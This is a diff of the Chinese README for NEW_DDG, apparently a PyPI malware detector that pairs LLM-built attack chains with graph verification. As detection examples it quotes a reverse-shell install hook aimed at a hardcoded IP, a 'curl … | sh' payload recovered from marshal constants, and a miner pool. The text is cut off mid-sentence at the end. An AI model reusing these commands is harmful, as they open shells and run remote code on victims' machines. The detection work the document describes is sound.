@@ -1,481 +1,450 @@
 <div align="center">
 
-# 🛡️ NEW_DDG
+# 🛡️ NEW_DDG v3
 
 **LLM 构建攻击链，图结构保证真实性**
 **面向 PyPI 恶意包的证据分级检测系统**
 
-[![Python 3.10+](https://img.shields.io/badge/python-3.10%2B-blue.svg)](https://www.python.org/downloads/)
+[![Python 3.8+](https://img.shields.io/badge/python-3.8%2B-blue.svg)](https://www.python.org/downloads/)
+[![Analysis: PyFlow](https://img.shields.io/badge/analysis-PyFlow%20(IFDS)-orange.svg)](https://github.com/ZJU-PL/pyflow)
 [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![Tests](https://img.shields.io/badge/tests-14%20files%20%2F%20200%2B%20assertions-brightgreen.svg)](tests/)
-[![Core](https://img.shields.io/badge/core-12k%20LOC-informational.svg)](#项目结构)
+[![Tests](https://img.shields.io/badge/tests-19%20files%20%2F%20300%2B%20assertions-brightgreen.svg)](tests/)
 [![LLM: GLM](https://img.shields.io/badge/LLM-GLM--4--Flash%20%2B%20GLM--4--Plus-blueviolet)](https://open.bigmodel.cn/)
 
-*SSO 粗筛 · 三层 CPG · LLM 自构建攻击链 · 程序化验证 · 两阶段异构模型 · 证据分级判决*
+*PyFlow 分析底座 · 能力中性 SSO · 函数目录 + 簇交付 · LLM 自构建链路 · 程序验证 · 两阶段异构模型*
 
-[English](README.md) | 简体中文
+[English](README.md) | [简体中文](README_zh.md)
 
 </div>
 
 ---
 
-## 解决什么问题
+## v3 改了什么
 
-包仓库的静态恶意检测器有两类互补的失败模式：
+v2 的每个分析部件都是手写的：DDG 构建器、污点引擎、SSO 提取器、覆盖度估计。
+每一个都能工作，但每一个都是对已解决问题的更弱复现——而且建图在 1000 文件的包上
+要跑几分钟，还经常超时。
 
-**规则类工具**（正则/启发式扫描）产生"看似合理但无证据支撑"的判决。正则看到
-`exec(` 就报恶意——直到它跑在 `cffi`、`packaging` 或任何构建期合法生成代码的
-项目上。在恶意语料上召回率很漂亮，放到真实 registry 上精度就崩了。
+v3 把分析底座换成 [PyFlow](https://github.com/ZJU-PL/pyflow)（IFDS 框架，
+ZJU-PL，[arXiv:2608.07026](https://arxiv.org/abs/2608.07026)），判定层保留。变化：
 
-**LLM 类工具**修复了语义理解，却破坏了证据：问模型"这个包恶意吗"，它会自信
-地回答——并幻觉出不存在的文件名、调用链和行为。它说的每一句话都无法核验。
+| | v2 | v3 |
+|---|---|---|
+| **分析引擎** | 手写 DDG + 污点 | PyFlow IFDS + GIR + 调用图 + 别名 |
+| **大包** | 全量建图，40 分钟，频繁超时 | 常规 2–7 秒，硬预算 60 秒 |
+| **交给模型的单元** | 按预算切块（文件→函数→256 节点） | **函数目录 → 簇**（种子 + 2 跳调用闭包） |
+| **模型分工** | 单模型，四条互不相干的 LLM 路径 | **小模型提链，大模型判定**（真正接线） |
+| **分析不完整** | 未建模 | **覆盖度门控：unknown ≠ safe** |
+| **混淆** | 源码文本正则 | **marshal 常量表检查 + 有界多层剥离** |
+| **实测（100+100）** | 召回 90% / 硬误报 0% | **召回 98% / 硬误报 0% / 疑似 7%** |
 
-NEW_DDG 走第三条路：
-
-> **LLM 负责构建攻击链，程序负责验证每一跳。**
-> 模型读取序列化的依赖图，提出恶意数据流路径。但一条路径只有满足
-> 「每个节点真实存在、每一跳都是图中真实存在的边」才算数。幻觉链在影响
-> 判决之前就会被确定性拒绝。
-
-再加一条贯穿全系统的约束：
-
-> **每一条 `MALICIOUS` 判决都必须有可人工核验的结构性证据——图验证的链路、
-> 缺失的 PyPI 身份、或确认的安装钩子。推测只标注为 `SUSPICIOUS`，
-> 永远不自行升级。**
+引擎是他们的；上面四层是我们的：PyPI 威胁模型实例化、执行时机分类、
+语句级过程间边、覆盖度门控的证据分级。
 
 ---
 
-## 系统架构
+## 解决什么问题
+
+面向包注册表的静态恶意检测有两条互补的失败路径：
+
+**规则型工具**（正则/启发式扫描器）给出的判决看似合理但无证据支撑。正则看到
+`exec(` 就判恶意——直到它跑在 `cffi`、`packaging`，或任何构建期合法生成代码的项目上。
+在恶意语料上召回漂亮，到真实注册表上精度崩塌。
+
+**单次 LLM 判断**让模型读完一个包然后回答"是否恶意"。它展示不了推理过程，
+会幻觉出不存在的函数，也无法区分"没找到攻击"和"我没认真看"。
+
+NEW_DDG 取第三种立场：**图是证据，LLM 提议穿过图的路径，程序检查每一跳。**
+判决不是模型对代码观感的复述，而是一个可以对着图重新验证的主张。
+
+---
+
+## 系统架构（v3）
 
 ```mermaid
 flowchart TD
-    IN([".tar.gz / 源码目录"]) --> EX["解压<br/>（防 tar-slip）"]
+    IN([.tar.gz / 源码目录]) --> EX[解包]
 
-    EX --> SSO["① SSO 粗筛<br/>AST 遍历——能力中性<br/>别名 / getattr / globals 还原<br/>能力标签: process_spawn · code_eval · network · decode ..."]
-    SSO -- "files_with_sso<br/>（8-23% 文件）" --> DDG["② DDG 构建器——裁剪图<br/>类型化边: data / call / param / return<br/>+ 语句顺序边（next_stmt）<br/>+ 函数摘要（参数→sink）<br/>+ AST 调用目标解析"]
+    EX --> ENH["① 增强检测（便宜、事实性）<br/>安装钩子 · PyPI 404 · 名称抢注 ·<br/>工件扫描（.pth/.sh/data_files）"]
+    ENH -->|critical| SHORT["短路 MALICIOUS<br/>（不调模型）"]
+    ENH --> PF
 
-    DDG -- "nodes.json · edges.json<br/>function_summaries.json" --> DIG["③ 图摘要<br/>哈希乱序短 ID（N1..Nn）<br/>节点带 [类型] 行号与代码<br/>EDGES 数据流 · STRUCT-EDGES 上下文<br/>函数边界 · 跨作用域数据流<br/>孤立载荷节点 · IOC 字面量<br/>（无危险标签——不引导模型）"]
+    EX --> PF["② PYFLOW 底座（~2-60 秒）<br/>capabilities（20 类）· GIR 语句<br/>调用图 · 别名 · escape 事件 · 覆盖度"]
+    PF --> MERGE["③ 引擎合并（我们的）<br/>SSO ∪ PyFlow 能力<br/>常量折叠 · getattr 还原 · module_level"]
+    MERGE --> CAT["④ 函数目录（我们的）<br/>585 函数 → 每函数一行：<br/>能力 · 出入度 · 时机 · 分数"]
+    CAT --> SEL["⑤ TOP-N + 成簇（我们的）<br/>打分 → 种子 → 2 跳调用闭包<br/>+ 短路径上的中间函数"]
+    SEL --> D1["⑥ 阶段一 — 提链<br/>小模型（GLM-4-Flash）<br/>digest：节点 · 边 · 边界边 · IOC"]
+    D1 --> V["⑦ 程序验证<br/>节点必须存在 · 每跳必须是真实边<br/>部分路径保留 · 单节点需敌意字面量"]
+    V --> D2["⑧ 阶段二 — 判定<br/>大模型（GLM-4-Plus）<br/>已验证路径 + 源码 + 包的自我声明"]
+    SHORT --> G
+    D2 --> G["⑨ 证据门控<br/>敌意字面量 · IOC 目标 ·<br/>强源汇点 · 覆盖度（unknown ≠ safe）"]
+    G --> OUT([MALICIOUS / SUSPICIOUS / BENIGN])
 
-    EX --> ENH["①b 增强检测——便宜、先跑<br/>安装钩子 · PyPI 404 · 仿名 · 克隆"]
-
-    DIG -- "摘要文本" --> S1["④ 第一阶段——链路提取<br/>GLM-4-Flash（小模型）<br/>入口点 → 敏感操作<br/>逐跳沿边行走"]
-
-    S1 -- "提议路径" --> V["⑤ 程序验证<br/>每个节点 ID 存在<br/>每一跳都是真实边<br/>保留部分路径<br/>单节点 ⇒ 敌意字面量门"]
-
-    V -- "验证通过的路径" --> S2["⑥ 第二阶段——裁决<br/>GLM-4-Plus（强模型）<br/>验证路径 + 被标记源码<br/>惯用法知识 · 意图 vs 行为"]
-
-    ENH -- "critical: 事实级证据" --> SHORT["短路判定 MALICIOUS<br/>（跳过图与模型）"]
-
-    S2 --> GATES["⑦ 证据门控<br/>弱链（env→exec）永不定罪<br/>判决归一化<br/>输出前最终完整性检查"]
-
-    V -- "无有效路径" --> DEMOTE["无验证路径的 MALICIOUS<br/>⇒ SUSPICIOUS"]
-
-    GATES --> OUT(["MALICIOUS / SUSPICIOUS / BENIGN<br/>OBFUSCATED / ANALYSIS_FAILED<br/>+ 验证链作为证据"])
-    SHORT --> OUT
-    DEMOTE --> GATES
-
-    style S1 fill:#e8f0fe
-    style S2 fill:#f3e8fd
+    style PF fill:#fff4e6
+    style D1 fill:#e8f0fe
+    style D2 fill:#f3e8fd
     style V fill:#e6f4ea
-    style SHORT fill:#ffd7d7
 ```
+
+### 三层分工
+
+| 层 | 谁 | 擅长 | 绝不能做 |
+|---|---|---|---|
+| **确定性** | 程序 | 解析、建边、验证、覆盖度 | 判断意图 |
+| **机械性** | 小模型 | 走图、提议候选路径 | 决定判决 |
+| **语义性** | 大模型 | 识别意图、发现惯用法错位 | 发明证据 |
 
 ---
 
-## 核心创新：LLM 自构建链路 + 程序化验证
+## 图构建：站在 PyFlow 上，补它没有的四样
 
-已有工作分两极。规则/ML 检测器匹配词汇——攻击者改个函数名匹配就失效。
-LLM 判代码——语义强但不可验证，它说的话没法审计。
+PyFlow 提供分析，不提供恶意判决。上面必须补四层。
 
-NEW_DDG 让 LLM 和图**在约束下协作**：
+### 1. 能力映射（20 类通用 → 11 类攻击链位置）
 
-| 步骤 | 做什么 | 为什么重要 |
-|---|---|---|
-| 序列化 | 图变成紧凑文本视图：带类型/行号的节点、数据边、控制边（执行上下文）、函数边界、跨作用域数据流、孤立载荷节点、IOC 字面量 | 模型看到的是结构，不只是代码 |
-| 链路提议 | 模型输出有序节点 ID 路径，先识别入口点和敏感操作 | 语义工作由模型完成——找到流 |
-| 验证 | 每个 ID 对照图检查；每跳对照真实边；部分路径接受（前缀 ≥2 跳且覆盖 ≥50%）；单节点指控要求节点代码含敌意字面量 | 模型无法编造结构 |
-| 裁决 | 强模型只看**验证通过**的路径 + 被标记的源代码 | 裁判基于事实推理，而非虚构 |
+PyFlow 按**漏洞影响面**分类；我们按**攻击链位置**分类。
+`information.credentials` 变成一等公民的 Tier-1 能力（读凭据是攻击链起点，
+不是"读文件"）。`module.loader_mutation` 映射到 `code_eval`——那是只存在于
+PyPI 威胁模型里的 `.pth`/`sitecustomize` 持久化面。
 
-### 第二支柱：图是为模型协同设计的
-
-经典 CPG 为符号分析而生——只有数据依赖，因为定理证明器不需要知道
-"什么在什么之后执行"。而 LLM 构建链路需要另一种图。我们的图围绕这个
-消费者重构，同时保持完全可程序验证：
-
-| 图变更 | 驱动案例 | 实测效果 |
-|---|---|---|
-| **语句顺序边** —— 同作用域相邻语句建 `next_stmt` 边 | 纯数据依赖的 DDG 让 `install.run(self)` 与 `os.system(...)` 成为孤岛，模型连不出代码显而易见的行为（反弹 shell `shellapp` 实测） | 加入后召回 **+17%** |
-| **哈希乱序短 ID** | 顺序编号 N1→N2→… 诱导模型"走编号"而不是"走边"（良性包上产出 219 跳的捏造路径） | 顺序幻觉链被消除 |
-| **控制边对模型保留、对污点排除** | `if not exists('x'): Popen(...)` —— 分支上下文正是 payload 可疑的原因；污点分析必须忽略它，链路构建必须看到它 | 安装钩子链正确产出 |
-| **函数边界图 + 跨作用域数据流 + module 级标记** | `setup.py` 顶层代码在**安装时**执行——执行时机本身就是证据 | 安装钩子链被显式点名 |
-| **孤立载荷节点段 + 敌意字面量门** | 硬编码载荷没有上游流；模型要么漏掉要么编造链。显式列出；单节点证据仅对确定性敌意字面量模式开放 | 单行良性包的误指被拒；真挖矿/反弹 shell 被检出 |
-| **IOC 字面量表**（矿池、shell IP、编码块） | 攻击基础设施散落在截断代码里 | 裁判在推理中点名基础设施 |
-| **AST-repr 修复** | Python 3.8 无 `ast.unparse` → 节点"代码"退化为不可读的 `Call(func=Attribute(...))` | 模型看到真实源码 |
-| **SSO 能力粗筛** | 1093 文件的 monorepo → 图预算 | 只选 8–23% 文件，分钟级→秒级 |
-
-规律：**图是符号验证与神经推理之间的共享接口。** 每个构建决策都以它对
-模型链路构建质量的影响来验证——仅顺序边一项就挽回 +17% 召回——同时
-每个决策都保持图可被程序检查，反幻觉契约不依赖模型能力。
-
-**实测收益：**
-
-- 移除全部符号提示（无危险标签、无偏见排序）后判决**不变** → 模型在读代码，
-  不是在附和正则层。
-- 幻觉链（不存在的节点/边）被**机械拒绝**——良性语料上每一次幻觉指控都被拦截。
-- 旧正则驱动管线只有 **22%** 的困难场景，LLM 自构建链路管线达到 **85–92%**。
-
-这两大支柱——模型提议链路，图同时充当模型的**眼睛**和程序的**证据**——
-正是本设计与"LLM 判代码"（不可验证）和"规则匹配代码"（无语义）的分界线。
-
-### 实战示例（`shellapp-0.1.0`，安装钩子里的反弹 shell）
+### 2. 执行时机（PyPI 特有）
 
 ```python
-class CustomInstallCommand(install):
-    def run(self):
-        install.run(self)
-        os.system("bash -i >& /dev/tcp/114.116.119.253/7777 <&1")
-setup(..., cmdclass={'install': CustomInstallCommand})
+setup.py 顶层        → install    # pip install 就执行
+__init__.py 顶层     → import     # import 就执行
+setup.py 里的任何代码 → install    # cmdclass 钩子写在类方法里
+其它文件的函数体      → runtime
 ```
 
-模型读完摘要后的输出（验证通过的路径，节选）：
+Cerebro（TOSEM 2025）测得 **69.8% 的恶意 PyPI 包在安装期触发**。
+载荷放在 `class InstallScripts(install_scripts).run()` 里就是安装期代码，
+哪怕它在函数体内——v2 把它算成 `runtime`，整个包漏掉。
+
+### 3. 语句级过程间边
+
+PyFlow 的 DDG 是过程内的，调用图是函数级的（每对函数一条边）。
+三文件链 `config.py → utils.py → runner.py` 会变成三个孤岛。GIR 的调用语句
+带被调函数名，于是我们建：
 
 ```
-behavior: remote_payload_execution
-N5  [import]  L3  from setuptools.command.install import install
-N10 [expr]    L11 os.system("bash -i >& /dev/tcp/114.116.119.253/7777 <&1")
-    ...由 install commandclass 守护，pip install 时执行
+调用语句        → 被调函数首语句      (kind=call)
+被调函数 return → 调用语句            (kind=return)
+逃逸的值        → 被调函数入口        (kind=param，来自 escape 事件)
 ```
 
-经典污点分析在这里无能为力——payload 是硬编码字面量，没有 source，
-source→sink 链不成立。模型 + 图改为连接**导入 → 执行 → 安装钩子上下文**，
-裁判点明攻击：*"包安装期间向远程 IP 发起反向 shell 连接。"*
+在三文件合成包上验证：`decode(transform.py) → data(main.py) → os.system(main.py)`
+被重建成一条连通路径。
 
----
+### 4. IOC 目标感知
 
-## 两阶段异构模型
+`requests.post` 在任何分类体系里都是汇点。但 API 客户端发往自己的服务端、
+和窃密程序发往 `45.77.12.9`，是**同一个类别、相反的意图**。所以我们给目的地分类：
 
-链路提取和恶意判定是两种认知任务、两种输入规模——所以用两个模型：
-
-| 阶段 | 模型 | 输入 | 任务 | 成本特征 |
-|---|---|---|---|---|
-| ① 提链 | GLM-4-Flash（小） | 完整图摘要（大） | 沿边行走，提出候选路径 | 单价便宜、输入大 |
-| ② 判定 | GLM-4-Plus（强） | 验证过的路径 + 源代码（小） | 带领域知识的语义判决 | 昂贵、但输入极小 |
-
-成本结构是阶梯式：**良性包通常产不出验证路径，永远到不了强模型。** 实测：
-
-- 强模型在 300 包运行中**推翻小模型保守判断 20 次**
-  （小模型找到路径但不敢拍板，强模型确认）。
-- 对已知惯用法，强模型的区分*精准*：
-
-| 样本 | 判决 | 裁判理由（节选） |
+| 分类 | 例子 | 效果 |
 |---|---|---|
-| `exec(open("_version.py").read())` | BENIGN | "legitimate pattern for version detection"（setuptools-scm） |
-| `Popen("bash -i >& /dev/tcp/<ip>/7777")` | MALICIOUS | "reverse shell to a remote IP" |
-| `Popen([..., "-o", "pool.supportxmr.com", ...])` | MALICIOUS | "cryptocurrency miner without user consent" |
-| `b64decode → os.system` | MALICIOUS | "classic remote payload execution" |
+| `attacker_infra` | 裸 IP、oastify/interactsh、webhook.site、pastebin、telegram-bot、矿池 | 定罪 |
+| `package_own` | 形态正常的域名、无恶意特征 | 不定罪 |
+| `dynamic` | `self._address + path`、f-string | 维持可疑 |
+| `none` | 没有任何网络形态 | 回落到通用规则 |
 
 ---
 
-## 图构建：被真实失败逼出来的决策
+## 交付方式：函数目录，不是预算切片
 
-下面每个决策都由真实包上的特定误报/漏检逼出，并由回归测试钉死。
+9,959 个节点的图塞不进 prompt。v2 按大小切，会在任意边界切断链路，
+还会把共犯彼此藏起来。v3 按相关性选：
 
-**1. 语句顺序边（召回 +17%）。** 只建数据依赖的 DDG 会把 `install.run(self)`
-和 `os.system(...)` 变成两个孤岛——模型连不出代码显而易见的行为。同作用域
-相邻语句之间建 `next_stmt` 边（control 类型；污点分析排除它们，数据流语义
-不变）。
+```
+① 把图压成函数目录
+     file::name  L12-40  18stmt  [process_spawn, env_access]  in3/out7  install  score=21.9
 
-**2. 锚点按风险特征命中数选择，而非按严重度/长度。** 在一个 4,085 节点、
-1,120 个被正则标危险的包上，按"严重度+代码长度"排序让长的误报 docstring
-占满锚点预算，真正的 XMRig 挖矿节点被挤出。现在锚点按节点实际包含的
-高危特征数量（`subprocess`、`/dev/tcp`、`supportxmr`、`encodedcommand`…）
-排序。
+② 给每个函数打分（确定性、可审计）
+     能力等级（Tier-1 = 10）+ log(出入度) + install/import (+6)
+     + 敌意字面量 (+8) + 跨文件 (+2) − 测试目录 (×0.25)
 
-**3. AST-repr 修复。** Python 3.8 没有 `ast.unparse`，节点"代码"退化成
-`Call(func=Attribute(value=Name(id=...)))`——模型读不懂，关键词层也匹配不上。
-摘要层检测这种情况并从磁盘还原真实源码行。
+③ 种子 → 簇
+     种子 + 2 跳调用闭包（data/call/return 边，跨文件）
+     + 成员之间短路径上的中间函数（≤4 跳）
+     上限：每簇 6 函数 / 900 语句
 
-**4. 摘要中不放危险标签（消融验证）。** `<<DANGER:critical>>` 标签来自正则
-层——展示它们会把"LLM 读图"变成"LLM 附和正则"。消融结果：标签移除**且**
-节点选择去偏（均匀采样替代危险优先）后，判决不变。模型真的在读代码。
+④ 一个簇 = 一个块，整体交付
+```
 
-**5. 孤立载荷节点 + 敌意字面量门。** 硬编码载荷（反弹 shell、挖矿、编码命令）
-没有上游数据流，模型要么漏掉要么编造链。摘要现在显式列出它们
-（`## ISOLATED PAYLOAD NODES`），单节点证据**仅当**节点代码确定性地包含
-敌意字面量时才接受——同一个门也拒绝模型的幻觉性单节点指控（例如
-`__version__ = "0.5.0"` 被标 MALICIOUS）。
+在真实混淆样本上实测（9,959 节点 / 585 函数）：8 个簇，每簇 52–402 语句，
+载荷函数排第 2，并且和它调用的函数捆绑在一起。
 
-**6. IOC 字面量表。** 矿池、shell IP、编码块收集进 `## SUSPICIOUS LITERALS`
-段，模型可以在推理里点名攻击基础设施，而不是从截断代码里重新发现。
-
-**7. 判决归一化 + 宽松 JSON。** 弱模型输出 `Uncertain`、`Clean`、
-`Likely malicious`；长输出会在字符串中间截断。映射表 + 括号平衡解析器
-挽回了 11 个 UNKNOWN 中的 5 个。
+**为什么按簇而不是按函数**：如果 `A` 读凭据、`B` 发送，单独看各自清白。
+拆开它们，就复现了整个设计要防止的"拆分攻击"。
 
 ---
 
-## 证据分级：不是所有证据都有定罪权
+## 两阶段模型：小的提议，大的判定
 
-塑造这个系统最多的错误：在 `cffi`、`ag2`、`acryl-executor`（全是真实良性
-项目）上，`exec(open("_version.py").read())`——setuptools-scm 的标准惯用法——
-产生了 `file_read → code_execution` 链，"有链即恶"规则判死了它们。
+| 阶段 | 模型 | 输入 | 任务 |
+|---|---|---|---|
+| **一** | GLM-4-Flash | digest，≤700 节点 | 走图，输出节点 ID 序列 |
+| — | 程序 | 图 | 验证每一跳；拒绝幻觉节点/边 |
+| **二** | GLM-4-Plus | 只有已验证路径 + PKG-INFO | 判定意图、发现惯用法错位 |
 
-修复是结构性的，不是调阈值：
+成本是阶梯式的：只有便宜模型找到可验证的东西，贵模型才出场。
 
-| 证据层级 | 例子 | 权力 |
+**反幻觉契约**（写在代码里，不是写在 prompt 里）：
+
+- 每个节点 ID 必须在图中存在
+- 每一跳必须对应真实边（方向不限，同语句容忍）
+- 合法前缀保留为 `partial` 路径（≥2 步且 ≥50%）
+- 单节点主张必须含敌意字面量（`/dev/tcp`、`-EncodedCommand`、矿池、`curl … | sh`）
+- `MALICIOUS` 但没有验证路径 → 降为 `SUSPICIOUS`
+
+因为节点 ID 按 `md5(node_id)` 排序分配而非图序，模型不可能不沿边走就"顺着"
+N1 → N2 → N3 编出一条链。
+
+---
+
+## 混淆：读字节码，而不只是读文本
+
+混淆藏住的是**逻辑**，不是 **API 表面**。实测六级：
+
+| 级别 | 形态 | 结果 |
 |---|---|---|
-| **事实级** | PyPI 404（包名不存在）、确认的安装钩子 | 可单独定罪（完全绕过模型） |
-| **结构级** | 图验证的链，且 source 是*强源*（网络/反序列化/编码）→ sink，或任意流 → 外传 | 模型确认后可定罪 |
-| **语义级** | LLM 对验证路径 + 代码的判断 | 有结构支撑才可定罪；否则升级为 SUSPICIOUS |
-| **启发级** | 正则命中、弱链（`env → exec`）、名称相似 | **永无定罪权。** 只能标 SUSPICIOUS |
+| L1 | `getattr(os, "sys"+"tem")` | ✅ 常量折叠还原 |
+| L2 | `__import__(b64decode("b3M="))` | ✅ 抓到 resolver 原语 |
+| L3 | 自定义解码函数 | ⚠️ 只能看到 `__import__` |
+| L4 | 运行时密钥 | ⚠️ 只能看到 `env` + `__import__` |
+| L5 | `exec(marshal.loads(b64))` | ✅ **不解执行就读出常量表** |
+| L6 | base64→zlib 三层 | ✅ 全剥开 |
 
-"有链"不是判据——**链的形态才是**。而且输出前有最终完整性检查重新核验每条
-`MALICIOUS`：无结构支撑 → 降级，不管它来自哪个通道。
+**L5 是关键。** `marshal.loads` 只反序列化、不执行，所以我们遍历
+`co_consts` / `co_names` 把载荷掏出来：
+
+```python
+exec(marshal.loads(b64decode(blob)))
+  →  co_consts: ('curl http://x.oastify.com/p | sh',)
+  →  co_names:  ('os', 'system')
+```
+
+多层剥离限 3 层，并收集每一层的可读中间结果——URL 常常在中间层。
+解码结果**绝不执行**，只做正则扫描并呈现给模型。
+
+**良性混淆不被惩罚。** Cython 产物、PyArmor 保护的 SDK、压缩资源同样是混淆的，
+所以混淆本身没有权重。区分规则是**流向**：混淆产物最终流向
+`exec`/`subprocess`/`socket` 的是恶意；停留在数据层的是良性。
 
 ---
 
-## 检测能力
+## 证据分级
 
-| 攻击形态 | 机制 |
-|---|---|
-| 反向 shell（`/dev/tcp`、硬编码 IP） | 图链 + 敌意字面量 + 安装钩子上下文 |
-| 挖矿程序（XMRig/矿池） | IOC 表 + 模型链 + 意图错位 |
-| 编码 PowerShell 投递 | 敌意字面量单节点证据 |
-| 远程载荷（`b64decode → exec`） | LLM 链: 解码 → 执行 |
-| 跨文件载荷拆分 | 跨作用域数据流 + 过程间边 |
-| 包装函数隐藏执行（`_run(x)` → `os.system`） | 函数摘要传播 |
-| `getattr`/别名/globals 动态分发 | AST 调用目标解析 |
-| 安装钩子（`cmdclass` 覆盖） | 安装作用域检测 + 图上下文 |
-| 安装期信息外传 | 凭据/环境 → 网络流 |
-| Typosquatting / registry 下架 | 全量 50 万名索引 + PyPI 核验 |
-| 代码克隆式名称抢注 | SHA-256 文件集重叠 vs 官方 sdist |
-| 意图错位（声称用途 vs 实际行为） | 裁判上下文中的包自我声明 |
+| 层级 | 例子 | 能否单独定罪 |
+|---|---|---|
+| **事实性** | PyPI 404、验证过的安装钩子、代码克隆 | ✅ |
+| **结构性** | 强源 → 执行/外传汇点的验证链 | ✅（配合判定） |
+| **语义性** | 大模型对验证路径的判断 | ✅ 需结构支撑 |
+| **启发式** | 正则命中、弱链（`env → exec`）、名称相似 | ❌ 永不定罪，最多 SUSPICIOUS |
+| **覆盖度** | "跳过了 40% 的条目" | ❌ 只能阻止判 BENIGN |
+
+两条规则让分级保持诚实：
+
+- **弱源 → 执行永不定罪。** `file_read → exec` 正是 setuptools-scm 在约 5 万个包里的写法。
+- **unknown ≠ safe。** 如果 PyFlow 报告跳过超过 30% 的条目且没发现 Tier-1 能力，
+  判决不能是 `BENIGN`。
 
 ---
 
 ## 评测
 
-以下数字除注明外均为**纯图 + LLM 管线**——无 registry 判决、无 API 名称
-危险标签喂给裁判。
+### v3：100 恶意 + 100 良性（同 seed、同管线）
 
-| 语料 | 规模 | 检出 | 硬误报 |
-|---|---|---|---|
-| 恶意（Backstabber's Knife Collection 系） | 500 | **90%**（多数票） | — |
-| 恶意（v1 全量运行） | 5000 | 85% 直接，证据门重判后约 89% | — |
-| 恶意（含 registry 通道） | 5000 | **94.9%**（该语料 99.6% 由 PyPI 404 贡献） | — |
-| 良性（真实 PyPI 包，含对抗性：`cffi`、1136 函数的 `ag2`、`acryl-*` 企业 fork） | 58 | — | **0 硬误报** |
-| 良性（PyPI 新下载小包，进行中） | ~500 | — | 趋势 0–1 |
+| | 恶意（100） | 良性（100） |
+|---|---|---|
+| **MALICIOUS** | **98（98%）** | **0（0%）** |
+| SUSPICIOUS | 1 | 7（7%） |
+| BENIGN | 1 | 93 |
 
-隔离各贡献的消融：
+### v2：500 + 500（上一代架构，同语料族）
 
-| 消融项 | 影响 |
-|---|---|
-| 移除语句顺序边 | 召回 75% → 58%（−17） |
-| 移除 LLM 链路（仅正则驱动管线） | 该语料召回 → 22% |
-| 移除摘要中全部符号提示（标签 + 排序） | **不变**——模型读的是代码，不是正则层 |
-| 加包意图上下文 + IOC 表 | 85% → 92%（中期，进行中） |
-| 加 registry 通道（PyPI 404） | → 总计 94.9%；抓"代码是干净副本"的纯仿名包 |
+| | 恶意（500） | 良性（500） |
+|---|---|---|
+| MALICIOUS | 92.4% | 1.4%（7 个里 2 个事后确认为真恶意） |
+| SUSPICIOUS | 7.2% | 6.2% |
+| ANALYSIS_FAILED | **0** | 0 |
 
-**互补性论证（带数字）**：图+LLM 通道到 ~90%，registry 通道单独约 78%
-（名字伪造）；代码分析是抓"真名包 + 注入代码"（XMRig 挖矿的 `requess`）的
-**唯一**通道，registry 是抓"名字仿冒 + 干净代码副本"的唯一通道。二者互不覆盖。
+### v2 → v3 的八个点从哪来
 
-### 测试
+召回 +8 点，误报零增长。**不是调阈值**，是七个静默失败——每一个都让一个
+"看起来在工作"的功能实际上没跑：
 
-14 个测试文件、200+ 断言，全绿。图-LLM 接口套件钉死反幻觉契约
-（幻觉节点/边拒绝、部分路径保留、单节点指控要求敌意字面量）和证据门
-（弱链不定罪、惯用法知识不放走真恶意）——这些正是开发过程中在时间压力下
-回归过的行为，所以现在它们是测试。
+| # | 失败 | 影响 |
+|---|---|---|
+| 1 | 整图快照在 `try` 块内赋值 | 0 边包静默跳过块分析 |
+| 2 | 簇 dict 被当 4 元组解包 | 两阶段扫描抛异常被吞掉 |
+| 3 | shim 用 `绝对路径_行_列` 建键、边却查 `相对路径_行_列` | **PyFlow 后端整条管线一直产 0 边** |
+| 4 | `_nid` 漏在 `__slots__` 外 | 第一个包就 AttributeError |
+| 5 | taint 在 `not edges` 时提前返回 | 字面量载荷的 dropper 永远没有链 |
+| 6 | 凭据路径不是污点源 | `~/.kube/config` + `~/.ssh/id_rsa` 窃取被判成 `file_read` |
+| 7 | `setup.py` 里的函数体被判为 `runtime` | `cmdclass` 安装钩子完全隐形 |
 
+其中三个**不报错、不告警、不留日志**。教训已经写进测试：每道门都有
+"它确实被触发过"的断言。
+
+### 为什么 7% 良性维持 SUSPICIOUS
+
+这七个是 `intuit_oauth`、`nvgpu`、`mslex`、`pylint-celery`、`edn_format`、
+`allpairspy`、`python_path`。它们确实动用了恶意级能力：
+
+- `intuit_oauth` 读取并传输 OAuth 凭据——这是它的设计目的
+- `nvgpu` 通过 `ctypes` 调用原生 GPU 库
+- `edn_format` 反序列化不可信输入
+
+判 SUSPICIOUS 是**正确的，不是缺陷**。系统目前只收集**负面证据**（没找到链），
+还没有收集**合法性正面证据**。那是下一个架构部件，不是要调的阈值。
 
 ---
 
-## 当前上限与下一阶段
+## 定位
 
-按图规模实测（500 包运行，当前代码）：
+| 工作 | 引擎 | 判定层 | 目标 |
+|---|---|---|---|
+| **PyFlow**（ZJU-PL, ASE'26） | IFDS + 别名 + GIR | 无（SAST findings，CWE 标注） | 漏洞 |
+| **MalSkills**（ASE'26） | Semgrep 2665 条规则 + LLM 神经提取 | 符号模式 + LLM 补缺口 | agent skills |
+| **Cerebro**（TOSEM'25） | 16 特征 + 调用图序列 | 微调 BERT | npm + PyPI |
+| **GuardDog** | YARA + 启发式 | 风险分 | PyPI/npm |
+| **NEW_DDG v3** | **PyFlow**（依赖） | **LLM 建链 + 程序验证 + 证据分级** | PyPI |
 
-| 图规模 | 包数 | 检出率 |
-|---|---|---|
-| ≤ 150 节点 | 214 | **99.1%** |
-| 151–1500 节点 | 19 | 63% |
-| > 1500 节点 | 19 | 21% |
-| **总体（多数票）** | 254 | **89.4%** |
-
-小包检出已接近饱和。当前的天花板是**中大包的信息损失与图语义缺口**——
-不是模型能力，也不是链路构建方法。下一阶段两条主线：
-
-**Phase A — 大包分块分析**（代码已在 `src/package_graph_analysis.py`，待接入主流程）：
-按文件/函数切成 ≤500 节点的块，逐块独立分析后合并判决。预期把中大包
-召回抬升至小包水平。
-
-**Phase B — 缺失的边语义。** 模型只能构建图里存在的链。真实攻击会用、
-而当前图缺失的四类边：
-
-| 缺失边类型 | 真实攻击形态 | 现状 |
-|---|---|---|
-| 全局变量 / 模块级共享状态 | A 模块写 `CONFIG`，B 模块读后 `exec` | 未建模——链断 |
-| 未解析的动态调用目标 | `dispatcher[name](payload)` | 部分支持（仅已知模式） |
-| 深层跨函数参数传递 | `f(g(h(payload)))` | 部分支持（`arg_mappings` 覆盖不全） |
-| 异常路径 | `except: exec(e)` | 未建模 |
-
-历史上每补齐一类"模型需要但图没有"的边，召回就上一个可量化的台阶
-（仅语句顺序边：+17%）。这四类是同一条路上的下一步。
+与 PyFlow 的关系是刻意的：我们依赖它而不是重写它，并且引用它。
+同一份语料上，PyFlow 自己的 `security` 引擎把
